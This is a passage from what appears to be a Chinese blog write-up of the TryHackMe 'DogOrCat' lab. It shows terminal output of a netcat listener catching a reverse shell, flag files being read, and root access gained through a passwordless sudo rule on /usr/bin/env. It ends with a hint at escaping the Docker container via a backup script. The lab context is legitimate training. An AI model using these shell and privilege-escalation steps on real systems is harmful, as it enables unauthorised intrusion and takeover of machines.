+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs BASH">Crazy:~/.ssh$ nc -lvnp 1337           <br>listening on [any] 1337 ...<br>connect to [10.11.75.230] from (UNKNOWN) [10.10.20.227] 39834<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@17e03f0af5ff:/var/www/html$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@17e03f0af5ff:/var/www/html$ <span class="hljs-built_in">cat</span> flag.php<br><span class="hljs-built_in">cat</span> flag.php<br>&lt;?php<br><span class="hljs-variable">$flag_1</span> = <span class="hljs-string">&quot;*****************************&quot;</span><br>?&gt;<br>www-data@17e03f0af5ff:/var/www/html$ <br><br>www-data@17e03f0af5ff:/var/www$ <span class="hljs-built_in">cat</span> flag2_QMW7JvaY2LvK.txt<br><span class="hljs-built_in">cat</span> flag2_QMW7JvaY2LvK.txt<br>THM&#123;LF1*****************&#125;<br>www-data@17e03f0af5ff:/var/www$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@17e03f0af5ff:/$ <span class="hljs-built_in">ls</span> -all<br><span class="hljs-built_in">ls</span> -all<br>total 80<br>drwxr-xr-x   1 root root 4096 Aug  4 17:30 .<br>drwxr-xr-x   1 root root 4096 Aug  4 17:30 ..<br>-rwxr-xr-x   1 root root    0 Aug  4 17:30 .dockerenv<br>drwxr-xr-x   1 root root 4096 Feb 26  2020 bin<br>drwxr-xr-x   2 root root 4096 Feb  1  2020 boot<br>drwxr-xr-x   5 root root  340 Aug  4 17:30 dev<br>drwxr-xr-x   1 root root 4096 Aug  4 17:30 etc<br>drwxr-xr-x   2 root root 4096 Feb  1  2020 home<br>drwxr-xr-x   1 root root 4096 Feb 26  2020 lib<br>drwxr-xr-x   2 root root 4096 Feb 24  2020 lib64<br>drwxr-xr-x   2 root root 4096 Feb 24  2020 media<br>drwxr-xr-x   2 root root 4096 Feb 24  2020 mnt<br>drwxr-xr-x   1 root root 4096 Aug  4 17:30 opt<br>dr-xr-xr-x 108 root root    0 Aug  4 17:30 proc<br>drwx------   1 root root 4096 Mar 10  2020 root<br>drwxr-xr-x   1 root root 4096 Feb 26  2020 run<br>drwxr-xr-x   1 root root 4096 Feb 26  2020 sbin<br>drwxr-xr-x   2 root root 4096 Feb 24  2020 srv<br>dr-xr-xr-x  13 root root    0 Aug  4 17:30 sys<br>drwxrwxrwt   1 root root 4096 Mar 10  2020 tmp<br>drwxr-xr-x   1 root root 4096 Feb 24  2020 usr<br>drwxr-xr-x   1 root root 4096 Feb 26  2020 var<br>www-data@17e03f0af5ff:/$ <br></code></pre></td></tr></table></figure>
+
+<p>在docker容器中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@17e03f0af5ff:/tmp$ sudo -l<br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on 17e03f0af5ff:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User www-data may run the following commands on 17e03f0af5ff:<br>    (root) NOPASSWD: /usr/bin/env<br>www-data@17e03f0af5ff:/tmp$ sudo <span class="hljs-built_in">env</span> /bin/bash<br>sudo <span class="hljs-built_in">env</span> /bin/bash<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span><br>flag3.txt<br><span class="hljs-built_in">cat</span> flag3.txt<br>THM&#123;D1ff3r3nt*************************&#125;<br></code></pre></td></tr></table></figure>
+
+<h6 id="逃："><a href="#逃：" class="headerlink" title="逃："></a>逃：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@17e03f0af5ff:/opt/backups<span class="hljs-comment"># ls</span><br>backup.sh  backup.tar<br>root@17e03f0af5ff:/opt/backups<span class="hljs-comment"># cat backup.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>tar cf /root/container/backup/backup.tar /root/container<br>root@17e03f0af5ff:/opt/backups<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>这目录容器中是没有的，或许是真实环境中的计划任务。</p>
+<p><img src="https://www.worldisend.com/img/image-20220805022559224.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220805022559224"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Tryhackme-DogOrCat</div>
+      <div>http://example.com/2022/10/06/Tryhackme-DogOrCat/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/Tryhackme-Alfred/" title="Tryhackme-Alfred">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Tryhackme-Alfred</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/Windows%E7%B3%BB%E7%BB%9FHook%E4%B8%8ER3%E5%B1%82%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" title="Windows系统Hook与R3层注入笔记">
+                        <span class="hidden-mobile">Windows系统Hook与R3层注入笔记</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
